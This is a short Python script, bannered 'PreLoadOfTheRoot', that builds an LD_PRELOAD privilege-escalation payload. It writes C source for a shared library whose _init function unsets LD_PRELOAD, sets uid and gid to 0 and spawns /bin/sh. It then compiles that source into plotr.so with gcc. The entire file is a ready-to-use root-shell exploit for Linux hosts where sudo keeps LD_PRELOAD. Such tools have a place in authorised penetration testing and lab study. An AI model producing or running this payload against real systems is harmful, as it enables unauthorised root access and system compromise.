#!/usr/bin/python3

import os

def init():
    logo = """
__________                .____                     .___________   ________________.__          __________               __   
\______   \_______   ____ |    |    _________     __| _/\_____  \_/ ____\__    ___/|  |__   ____\______   \ ____   _____/  |_ 
 |     ___/\_  __ \_/ __ \|    |   /  _ \__  \   / __ |  /   |   \   __\  |    |   |  |  \_/ __ \|       _//  _ \ /  _ \   __\\
 |    |     |  | \/\  ___/|    |__(  <_> ) __ \_/ /_/ | /    |    \  |    |    |   |   Y  \  ___/|    |   (  <_> |  <_> )  |  
 |____|     |__|    \___  >_______ \____(____  /\____ | \_______  /__|    |____|   |___|  /\___  >____|_  /\____/ \____/|__|  
                        \/        \/         \/      \/         \/                      \/     \/       \/                    
"""

    print(logo)

def cset():

    c_source_code = """#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
    
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
    }
"""
    f = open("plotr.c","w")
    f.write(c_source_code)

    

def compiling():

    cmd = "gcc -fPIC -shared -o plotr.so plotr.c -nostartfiles"
    os.system(cmd)

def main():
    init()
    cset()
    compiling()

if __name__ == "__main__":

    main()

